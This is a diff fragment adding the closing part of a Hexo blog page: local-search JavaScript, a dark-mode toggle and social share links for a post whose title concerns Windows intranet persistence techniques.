+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)-SSP%26HOOK%26DSRM%26SIDhistory%26SkeletonKey + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Fb140a792%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/b140a792/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
